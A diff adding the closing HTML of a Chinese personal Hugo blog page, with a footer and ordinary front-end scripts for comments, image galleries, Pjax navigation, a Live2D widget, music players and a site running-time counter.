+        <div class="article-details">
+            <h2 class="article-title">1.31 信息搜集</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+        <div class="comment-container mt-8"></div>
+        
+        
+    <script src="https://utteranc.es/client.js" 
+        repo="makabaka11/makabaka11.github.io"
+        issue-term="pathname"
+        
+        crossorigin="anonymous"
+        async
+        >
+</script>
+
+<style>
+    .utterances {
+        max-width: unset;
+    }
+</style>
+
+<script>
+    let utterancesLoaded = false;
+
+    function setUtterancesTheme(theme) {
+        let utterances = document.querySelector('.utterances iframe');
+        if (utterances) {
+            utterances.contentWindow.postMessage(
+                {
+                    type: 'set-theme',
+                    theme: `github-${theme}`
+                },
+                'https://utteranc.es'
+            );
+        }
+    }
+
+    addEventListener('message', event => {
+        if (event.origin !== 'https://utteranc.es') return;
+
+        
+        utterancesLoaded = true;
+        setUtterancesTheme(document.documentElement.dataset.scheme)
+    });
+
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (!utterancesLoaded) return;
+        setUtterancesTheme(e.detail)
+    })
+</script>
+
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2025 - 
+        
+        2026 Retr0
+    </section>
+    
+    <section class="running-time">
+    已存在于互联网
+    <span id="runningdays" class="running-days"></span>
+    </section>
+    
+    <section class="totalcount">
+        
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+        发表了114篇文章 · 
+        总计185.16k字
+    </section>
+
+
+    <section class="powerby">
+        
+            Powered by ctOS <br/>
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.31.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+
+                <script src="/js/APlayer.min.js"></script>
+                <script src="/js/Meting.min.js"></script>
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.eaf1211e4c7db355f37ceea53df13700e1b77fbcc3cfe8c1c1f69e4468a752e1.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+<link rel="stylesheet" href="/css/custom.css">
+
+<script>
+(function () {
+    const url = new URL(window.location.href);
+
+    
+    if (url.searchParams.has('utterances')) {
+
+        
+        
+        window.location.replace(window.location.pathname);
+    }
+})();
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script>
+
+<script>
+    var pjax = new Pjax({
+        selectors: [".main-container"]
+    });
+</script>
+
+
+<script src=https://www.retr0.xyz/js/topbar.min.js></script>
+
+
+
+<script>
+function initUtterances() {
+    const isArticle = document.querySelector('.article-page') && document.querySelector('.article-content');
+    if (!isArticle) return;
+
+    const oldScript = document.querySelector('script[src^="https://utteranc.es/client.js"]');
+    if (oldScript) oldScript.remove();
+
+    const container = document.querySelector('.comment-container');
+    if (!container) return;
+
+    container.innerHTML = '';
+
+    let script = document.createElement('script');
+    script.src = 'https://utteranc.es/client.js';
+    script.setAttribute('repo', 'makabaka11/makabaka11.github.io');
+    script.setAttribute('issue-term', 'pathname');
+    script.setAttribute('crossorigin', 'anonymous');
+    script.async = true;
+    container.appendChild(script);
+}
+</script>
+
+<script>
+document.addEventListener("DOMContentLoaded", () => {
+    if (!window.pjax || !window.pjax.state) initUtterances();
+});
+</script>
+
+
+<script>
+pjax._handleResponse = pjax.handleResponse;
+pjax.handleResponse = function(responseText, request, href, options) {
+    if (request.responseText.match("<html")) {
+        if (responseText) {
+            let newDom = new DOMParser().parseFromString(responseText, 'text/html');
+            document.body.setAttribute("class", newDom.body.className);
+        }
+        pjax._handleResponse(responseText, request, href, options);
+    }
+};
+</script>
+
+
+<script>
+topbar.config({
+    barColors: {
+        '0': 'rgba(255, 255, 255, 1)',
+        '1.0': 'rgba(255, 183, 197, 1)'
+    }
+});
+
+document.addEventListener('pjax:send', () => topbar.show());
+
+document.addEventListener('pjax:complete', () => {
+    window.Stack.init();
+    topbar.hide();
+    setTimeout(initUtterances, 0);
+    updateViewCount();
+    renderKaTeX();
+    initPhotoSwipeFromDOM('.article-content');   
+    initLive2D();                                
+});
+</script>
+
+
+<script>
+function updateViewCount() {
+    const viewCountEl = document.getElementById('vercount_value_page_pv');
+    if (!viewCountEl) return;
+
+    viewCountEl.textContent = 'loading...';
+    const url = 'https://cn.vercount.one/js';
+
+    const old = document.querySelector(`script[src="${url}"]`);
+    if (old) old.remove();
+
+    const s = document.createElement('script');
+    s.src = url;
+    s.defer = true;
+    document.head.appendChild(s);
+
+    showHideView();
+}
+
+function showHideView() {
+    const viewCounts = document.querySelectorAll("#viewCount");
+    const isArticle = document.querySelector(".article-page");
+    viewCounts.forEach(ele => ele.style.display = isArticle ? 'block' : 'none');
+}
+</script>
+
+<script>
+    function showHideView() {
+        
+        let viewCounts = document.querySelectorAll("#viewCount");
+        if (viewCounts) {
+            
+            let article =  document.querySelector(".article-page");
+            if (!article) {
+                viewCounts.forEach(ele => {
+                    ele.style.display = 'none';
+                });
+            }
+        }
+    }
+    
+    showHideView();
+</script>
+
+
+
+<script>
+async function renderKaTeX() {
+    let katex = document.querySelector(".math-katex");
+    if (!katex) return;
+
+    while (typeof renderMathInElement !== 'function') {
+        await new Promise(r => setTimeout(r, 500));
+    }
+
+    const content = document.querySelector('.article-content') || document.body;
+    renderMathInElement(content, {
+        delimiters: [
+            { left: "$$", right: "$$", display: true },
+            { left: "$", right: "$", display: false },
+            { left: "\\(", right: "\\)", display: false },
+            { left: "\\[", right: "\\]", display: true }
+        ],
+        ignoredClasses: ["gist"]
+    });
+}
+</script>
+
+
+<div id="particles-js"></div>
+
+<script src=https://www.retr0.xyz/background/particles.min.js></script>
+<script>
+particlesJS.load('particles-js',
+    "https://www.retr0.xyz/background/particlesjs-config.json",
+    () => console.log('particles.js loaded')
+);
+</script>
+
+<style>
+#particles-js {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%;
+    z-index: -1;
+}
+</style>
+
+<script>
+
+function initPhotoSwipeFromDOM(selector) {
+    if (!window.PhotoSwipe) return;
+
+    const containers = document.querySelectorAll(selector);
+    if (!containers.length) return;
+
+    containers.forEach(container => {
+        const images = container.querySelectorAll('img');
+
+        images.forEach((img, index) => {
+
+            
+            function getImageSize() {
+                return new Promise(resolve => {
+                    if (img.complete && img.naturalWidth) {
+                        resolve({
+                            w: img.naturalWidth,
+                            h: img.naturalHeight
+                        });
+                    } else {
+                        const tmp = new Image();
+                        tmp.src = img.src || img.getAttribute("data-src");
+                        tmp.onload = () => resolve({ w: tmp.width, h: tmp.height });
+                    }
+                });
+            }
+
+            img.style.cursor = "zoom-in";
+
+            
+            img.addEventListener("click", async (e) => {
+                e.preventDefault();
+
+                const size = await getImageSize();
+                const pswpEl = document.querySelector('.pswp');
+
+                const items = Array.from(images).map(i => ({
+                    src: i.src || i.getAttribute("data-src"),
+                    msrc: i.src,
+                    w: i.naturalWidth || 800,
+                    h: i.naturalHeight || 600,
+                }));
+
+                items[index].w = size.w;
+                items[index].h = size.h;
+
+                const gallery = new PhotoSwipe(pswpEl, PhotoSwipeUI_Default, items, {
+                    index,
+                    history: false
+                });
+
+                
+                
+                
+                enablePhotoSwipeWebShare(gallery);
+
+                gallery.init();
+            });
+        });
+    });
+}
+
+
+
+
+
+function enablePhotoSwipeWebShare(gallery) {
+    gallery.listen('shareLinkClick', function(shareButtonData, e) {
+        e.preventDefault();
+
+        const item = gallery.currItem;
+
+        if (navigator.share) {
+            navigator.share({
+                title: document.title,
+                text: '给你分享一张图片：',
+                url: item.src
+            }).catch(err => console.log("分享失败：", err));
+
+            return false; 
+        }
+
+        
+        return true;
+    });
+}
+</script>
+
+
+
+<script>
+
+
+window._live2d_loaded = window._live2d_loaded || false;
+window._live2d_initialized = window._live2d_initialized || false;
+
+
+function loadLive2DAssetsOnce(cdnPath) {
+    if (window._live2d_loaded) return Promise.resolve();
+
+    window._live2d_loaded = true;
+
+    return Promise.all([
+        loadRes(cdnPath + "waifu.css", "css"),
+        loadRes(cdnPath + "Core/live2dcubismcore.js", "js"),
+        loadRes(cdnPath + "live2d-sdk.js", "js"),
+        loadRes(cdnPath + "waifu-tips.js", "js")
+    ]);
+}
+
+
+function initLive2DWidgetOnce(cdnPath) {
+
+    if (window._live2d_initialized) return;
+
+    
+    const old = document.querySelector("#waifu");
+    if (old) old.remove();
+
+    window._live2d_initialized = true;
+
+    initWidget({
+        waifuPath: cdnPath + "waifu-tips.json",
+        cdnPath: cdnPath + "Resources/",
+        tools: ["hitokoto", "asteroids", "express", "switch-model", "switch-texture", "photo", "info", "quit"],
+        dragEnable: true,
+        dragDirection: ["x", "y"],
+        switchType: "order"
+    });
+
+    console.log("[Live2D] Widget initialized.");
+}
+
+
+function loadRes(url, type) {
+    return new Promise((resolve) => {
+        let tag;
+        if (type === "css") {
+            tag = document.createElement("link");
+            tag.rel = "stylesheet";
+            tag.href = url;
+        } else {
+            tag = document.createElement("script");
+            tag.src = url;
+        }
+        tag.onload = resolve;
+        document.head.appendChild(tag);
+    });
+}
+
+
+function initLive2D() {
+    if (screen.width < 768) return;
+
+    const cdnPath = "https://www.retr0.xyz/blog-live2d/";
+
+    loadLive2DAssetsOnce(cdnPath)
+        .then(() => initLive2DWidgetOnce(cdnPath));
+}
+
+initLive2D();  
+
+
+document.addEventListener("pjax:complete", () => {
+    initLive2D(); 
+});
+</script>
+
+
+<style>
+    .highlight {
+         
+        max-height: 400px;
+        overflow: hidden;
+        position: relative;  
+    }
+
+    .code-show {
+        max-height: none !important;
+    }
+
+    .code-more-box {
+        width: 100%;
+        padding-top: 78px;
+        background-image: -webkit-gradient(linear, left top, left bottom, from(rgba(255, 255, 255, 0)), to(#fff));
+        position: absolute;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        z-index: 1;
+    }
+
+    .code-more-btn {
+        display: block;
+        margin: auto;
+        width: 44px;
+        height: 22px;
+        background: #f0f0f5;
+        border-top-left-radius: 8px;
+        border-top-right-radius: 8px;
+        padding-top: 6px;
+        cursor: pointer;
+    }
+
+    .code-more-img {
+        cursor: pointer !important;
+        display: block;
+        margin: auto;
+        width: 22px;
+        height: 16px;
+    }
+</style>
+
+<script>
+  function initCodeMoreBox() {
+    let codeBlocks = document.querySelectorAll(".highlight");
+    if (!codeBlocks) {
+      return;
+    }
+    codeBlocks.forEach(codeBlock => {
+      
+      const existingBox = codeBlock.querySelector('.code-more-box');
+      if (existingBox) existingBox.remove();
+
+      
+      if (codeBlock.scrollHeight <= codeBlock.clientHeight) {
+        return;
+      }
+      
+      
+      let codeMoreBox = document.createElement('div');
+      codeMoreBox.classList.add('code-more-box');
+      
+      let codeMoreBtn = document.createElement('span');
+      codeMoreBtn.classList.add('code-more-btn');
+      codeMoreBtn.addEventListener('click', () => {
+        codeBlock.classList.add('code-show');
+        codeMoreBox.style.display = 'none';
+        
+        window.dispatchEvent(new Event('resize'))
+      })
+      
+      let img = document.createElement('img');
+      img.classList.add('code-more-img');
+      img.src = "https://www.retr0.xyz/icons/codeMore.png"
+      
+      codeMoreBtn.appendChild(img);
+      codeMoreBox.appendChild(codeMoreBtn);
+      codeBlock.appendChild(codeMoreBox)
+    })
+  }
+  
+  initCodeMoreBox();
+  
+  
+  document.addEventListener('pjax:complete', () => {
+    initCodeMoreBox();
+  });
+</script>
+
+
+<script>
+
+
+window.__articlePlayers = window.__articlePlayers || [];
+
+
+
+function getGlobalMetingPlayer() {
+    return window.__globalMetingPlayer || null;
+}
+
+
+
+function pauseGlobalMeting() {
+    const p = getGlobalMetingPlayer();
+    if (p && !p.audio.paused) {
+        p.pause();
+        console.log('[APlayer] Pause global Meting');
+    }
+}
+
+
+
+function pauseArticlePlayers() {
+    window.__articlePlayers.forEach(p => {
+        if (p && !p.audio.paused) {
+            p.pause();
+        }
+    });
+}
+
+
+
+function initAPlayers() {
+    if (typeof APlayer === "undefined") return;
+
+    document.querySelectorAll('.aplayer-article').forEach(el => {
+        if (el.dataset.loaded === "true") return;
+        el.dataset.loaded = "true";
+
+        const ap = new APlayer({
+            container: el,
+            fixed: false,
+            autoplay: false,
+            loop: 'none',
+            order: 'list',
+            preload: 'metadata',
+            volume: 0.7,
+            mutex: false, 
+            audio: [{
+                name: el.dataset.title || 'Unknown',
+                artist: el.dataset.artist || '',
+                url: el.dataset.src,
+                cover: el.dataset.cover || '',
+                lrc: el.dataset.lrc || '',
+            }]
+        });
+
+        
+        ap.on('play', () => {
+            
+            pauseGlobalMeting();
+
+            
+            window.__articlePlayers.forEach(other => {
+                if (other !== ap && !other.audio.paused) {
+                    other.pause();
+                }
+            });
+
+    console.log('[APlayer] Switch article track');
+});
+
+
+        window.__articlePlayers.push(ap);
+    });
+}
+
+
+
+function bindMetingMutex() {
+    const p = getGlobalMetingPlayer();
+    if (!p || p.__mutexBound) return;
+
+    p.__mutexBound = true;
+
+    
+    p.on('play', () => {
+        pauseArticlePlayers();
+    });
+
+    console.log('[Meting] Mutex bound');
+}
+
+
+
+function initAllPlayers() {
+    initAPlayers();
+    bindMetingMutex();
+}
+
+
+
+document.addEventListener("DOMContentLoaded", initAllPlayers);
+document.addEventListener("pjax:complete", initAllPlayers);
+</script>
+
+<script>
+
+
+function destroyArticlePlayers() {
+    if (!window.__articlePlayers || window.__articlePlayers.length === 0) return;
+
+    window.__articlePlayers.forEach(ap => {
+        try {
+            if (!ap.audio.paused) {
+                ap.pause();
+            }
+            ap.destroy(); 
+        } catch (e) {
+            console.warn('[APlayer] destroy failed', e);
+        }
+    });
+
+    window.__articlePlayers = [];
+    console.log('[APlayer] Article players destroyed');
+}
+
+
+
+document.addEventListener('pjax:send', () => {
+    destroyArticlePlayers();
+});
+</script>
+
+
+<script>
+let runningTimeTimer = null;
+
+function updateRunningTime() {
+    const el = document.getElementById('runningdays');
+    if (!el) return;
+
+    let start = '2025-10-26 00:00:00'; 
+    start = new Date(start.replace(/-/g, "/"));
+    const now = new Date();
+
+    const diff = Math.floor((now.getTime() - start.getTime()) / 1000);
+
+    const days = Math.floor(diff / (24 * 3600));
+    const hours = Math.floor((diff % (24 * 3600)) / 3600);
+    const minutes = Math.floor((diff % 3600) / 60);
+    const seconds = diff % 60;
+
+    el.textContent =
+        `${days}天${hours}小时${minutes}分钟${seconds}秒`;
+}
+
+function initRunningTime() {
+    
+    updateRunningTime();
+
+    
+    if (runningTimeTimer) {
+        clearInterval(runningTimeTimer);
+    }
+
+    runningTimeTimer = setInterval(updateRunningTime, 1000);
+}
+
+ 
+document.addEventListener('DOMContentLoaded', () => {
+    initRunningTime();
+});
+
+ 
+document.addEventListener('pjax:complete', () => {
+    initRunningTime();
+});
+</script>
+
+
+
+
+<script>
+  
+  let originalTitle = document.title; 
+  const leaveTip = "桥豆麻袋(#°Д°)";     
+  const backTip = "(*'▽`*)欢迎回来!";        
+  const recoverDelay = 2000;           
+  let visibilityChangeHandler = null;  
+  let titleRecoverTimer = null;        
+
+  
+  function initTitleSwitch() {
+    
+    if (visibilityChangeHandler) {
+      document.removeEventListener('visibilitychange', visibilityChangeHandler);
+    }
+
+    
+    originalTitle = document.title;
+
+    
+    visibilityChangeHandler = function() {
+      
+      clearTimeout(titleRecoverTimer);
+
+      if (document.hidden) {
+        
+        document.title = leaveTip;
+      } else {
+        
+        document.title = backTip;
+        
+        titleRecoverTimer = setTimeout(() => {
+          document.title = originalTitle;
+        }, recoverDelay);
+      }
+    };
+
+    
+    document.addEventListener('visibilitychange', visibilityChangeHandler);
+  }
+
+  
+  document.addEventListener('pjax:success', function() {
+    
+    initTitleSwitch();
+  });
+
+  
+  window.onload = function() {
+    initTitleSwitch();
+  };
+</script>
+
+
+
+
+
+
+
+
+
+
+        
+
+
+<meting-js
+  id="14477349320"
+  server="netease"
+  type="playlist"
+  fixed="true"
+  bottom="20px"
+  right="20px"
+  autoplay="false"
+  width="300px"
+  preload="metadata"
+  mutex="false">
+</meting-js>
+
+<script>
+(function () {
+
+  
+  if (window.__global_meting_initialized) return;
+  window.__global_meting_initialized = true;
+
+  const STORAGE_KEY = "playInfo";
+  const PLAYLIST_ID = "14477349320";
+
+  function initGlobalMeting() {
+    const meting = document.querySelector('meting-js');
+    if (!meting) return;
+
+    
+    meting.addEventListener('aplayer-loaded', () => {
+      const ap = meting.aplayer;
+      if (!ap) return;
+
+      
+      window.__globalMetingPlayer = ap;
+      console.log('[Meting] Global APlayer ready');
+
+      bindPlayerEvents(ap);
+      restorePlayState(ap);
+    }, { once: true });
+  }
+
+  function bindPlayerEvents(ap) {
+    
+    const save = () => savePlayState(ap);
+
+    window.addEventListener('beforeunload', save);
+    document.addEventListener('visibilitychange', save);
+
+    
+    ap.on('play', () => {
+      document.dispatchEvent(new CustomEvent('global-player-play'));
+    });
+  }
+
+  function savePlayState(ap) {
+    if (!ap || !ap.list || !ap.audio) return;
+
+    const data = {
+      playlistId: PLAYLIST_ID,
+      index: ap.list.index,
+      currentTime: ap.audio.currentTime,
+      paused: ap.paused
+    };
+
+    localStorage.setItem(STORAGE_KEY, JSON.stringify(data));
+  }
+
+  function restorePlayState(ap) {
+    const data = JSON.parse(localStorage.getItem(STORAGE_KEY));
+    if (!data || data.playlistId !== PLAYLIST_ID) return;
+
+    if (data.index < ap.list.songs.length) {
+      ap.list.switch(data.index);
+      ap.once('canplay', () => {
+        ap.seek(data.currentTime || 0);
+        if (!data.paused) {
+          ap.play().catch(() => {
+            ap.notice("点击继续播放", 3000);
+          });
+        }
+      });
+    }
+  }
+
+  
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', initGlobalMeting);
+  } else {
+    initGlobalMeting();
+  }
+
+})();
+</script>
+
+    </body>
+</html>
